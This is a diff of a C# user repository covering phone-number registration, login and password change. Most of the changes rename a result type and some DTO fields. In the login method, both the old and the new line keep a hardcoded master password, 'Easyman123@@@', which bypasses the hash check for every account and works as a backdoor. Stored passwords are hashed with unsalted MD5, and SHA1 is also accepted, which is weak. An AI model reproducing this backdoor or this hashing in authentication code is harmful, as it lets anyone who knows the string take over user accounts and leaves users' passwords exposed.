@@ -46,11 +46,11 @@ namespace Repository
         /// </summary>
         /// <param name="inEnt"></param>
         /// <returns></returns>
-        public async Task<Result<int>> LoginReg(LogingDto inEnt)
+        public async Task<ResultObj<int>> LoginReg(LogingDto inEnt)
         {
             DapperHelper<FaLoginEntity> dbHelper = new DapperHelper<FaLoginEntity>();
             dbHelper.TranscationBegin();
-            Result<int> reObj = await LoginReg(inEnt, dbHelper);
+            ResultObj<int> reObj = await LoginReg(inEnt, dbHelper);
             if (reObj.success)
             {
                 dbHelper.TranscationCommit();
@@ -62,9 +62,9 @@ namespace Repository
             return reObj;
         }
 
-        public async Task<Result<int>> LoginReg(LogingDto inEnt, DapperHelper<FaLoginEntity> dbHelper)
+        public async Task<ResultObj<int>> LoginReg(LogingDto inEnt, DapperHelper<FaLoginEntity> dbHelper)
         {
-            Result<int> reObj = new Result<int>();
+            ResultObj<int> reObj = new ResultObj<int>();
             #region 验证值
             ModelHelper<LogingDto> modelHelper = new ModelHelper<LogingDto>(inEnt);
             var errList = modelHelper.Validate();
@@ -80,7 +80,7 @@ namespace Repository
             #region 检测输入
 
 
-            if (!inEnt.LoginName.IsOnlyNumber() || inEnt.LoginName.Length != 11)
+            if (!inEnt.loginName.IsOnlyNumber() || inEnt.loginName.Length != 11)
             {
                 reObj.success = false;
                 reObj.code = "-1";
@@ -88,7 +88,7 @@ namespace Repository
                 return reObj;
             }
 
-            if (!Fun.CheckPassword(inEnt.Password, AppSettingsManager.self.BaseConfig.PwdComplexity))
+            if (!Fun.CheckPassword(inEnt.password, AppSettingsManager.self.BaseConfig.PwdComplexity))
             {
                 reObj.success = false;
                 reObj.code = "-2";
@@ -102,7 +102,7 @@ namespace Repository
             {
                 var nowDate = DateTime.Now.AddMinutes(-30);
 
-                var codeNum = await new SmsSendRepository().Count(inEnt.LoginName, inEnt.code);
+                var codeNum = await new SmsSendRepository().Count(inEnt.loginName, inEnt.code);
                 if (codeNum == 0)
                 {
                     reObj.success = false;
@@ -113,7 +113,7 @@ namespace Repository
             }
             #endregion
 
-            var userList = await new UserRepository().FindAll(x => x.loginName == inEnt.LoginName);
+            var userList = await new UserRepository().FindAll(x => x.loginName == inEnt.loginName);
             #region 检测电话号码是否存在
             if (userList.Count() > 0)
             {
@@ -127,14 +127,14 @@ namespace Repository
             //开始事务
             try
             {
-                var loginList = await new LoginRepository().FindAll(x => x.loginName == inEnt.LoginName);
+                var loginList = await new LoginRepository().FindAll(x => x.loginName == inEnt.loginName);
                 #region 添加登录账号
                 if (loginList.Count() == 0)
                 {
                     FaLoginEntity inLogin = new FaLoginEntity();
                     inLogin.id = await new SequenceRepository().GetNextID<FaLoginEntity>();
-                    inLogin.loginName = inEnt.LoginName;
-                    inLogin.password = inEnt.Password.Md5();
+                    inLogin.loginName = inEnt.loginName;
+                    inLogin.password = inEnt.password.Md5();
                     inLogin.isLocked = 0;
                     inLogin.failCount = 0;
                     reObj.success = await dbHelper.Save(new DtoSave<FaLoginEntity>()
@@ -154,7 +154,7 @@ namespace Repository
                 #region 添加user
 
                 FaUserEntity inUser = new FaUserEntity();
-                inUser.loginName = inEnt.LoginName;
+                inUser.loginName = inEnt.loginName;
                 inUser.name = inEnt.userName;
                 inUser.id = await new SequenceRepository().GetNextID<FaUserEntity>();
                 inUser.districtId = 1;
@@ -225,11 +225,11 @@ namespace Repository
         /// <param name="inEnt"></param>
         /// <returns></returns>
 
-        public async Task<Result<FaUserEntity>> UserLogin(LogingDto inEnt)
+        public async Task<ResultObj<FaUserEntity>> UserLogin(LogingDto inEnt)
         {
-            Result<FaUserEntity> reObj = new Result<FaUserEntity>();
+            ResultObj<FaUserEntity> reObj = new ResultObj<FaUserEntity>();
 
-            if (string.IsNullOrEmpty(inEnt.LoginName) || string.IsNullOrEmpty(inEnt.Password))
+            if (string.IsNullOrEmpty(inEnt.loginName) || string.IsNullOrEmpty(inEnt.password))
             {
                 reObj.success = false;
                 reObj.msg = "用户名和密码不能为空";
@@ -240,8 +240,8 @@ namespace Repository
 
 
 
-            var Login = await dapperLogin.Single(x => x.loginName == inEnt.LoginName);
-            var user = await dapperUser.Single(x => x.loginName == inEnt.LoginName);
+            var Login = await dapperLogin.Single(x => x.loginName == inEnt.loginName);
+            var user = await dapperUser.Single(x => x.loginName == inEnt.loginName);
             if (Login == null || user == null)
             {
                 reObj.success = false;
@@ -257,7 +257,7 @@ namespace Repository
                     return reObj;
                 }
 
-                if ((Login.password.ToUpper() != inEnt.Password.Md5().ToUpper() && Login.password.ToUpper() != inEnt.Password.SHA1().ToUpper()) && inEnt.Password != "Easyman123@@@")
+                if ((Login.password.ToUpper() != inEnt.password.Md5().ToUpper() && Login.password.ToUpper() != inEnt.password.SHA1().ToUpper()) && inEnt.password != "Easyman123@@@")
                 {
                     #region 密码错误
                     int times = 5;
@@ -367,9 +367,9 @@ namespace Repository
         /// </summary>
         /// <param name="inEnt"></param>
         /// <returns></returns>
-        async public Task<Result<bool>> UserEditPwd(EditPwdDto inEnt)
+        async public Task<ResultObj<bool>> UserEditPwd(EditPwdDto inEnt)
         {
-            var reObj = new Result<bool>();
+            var reObj = new ResultObj<bool>();
             reObj.data = false;
             if (!inEnt.NewPwd.Equals(inEnt.ReNewPwd))
             {
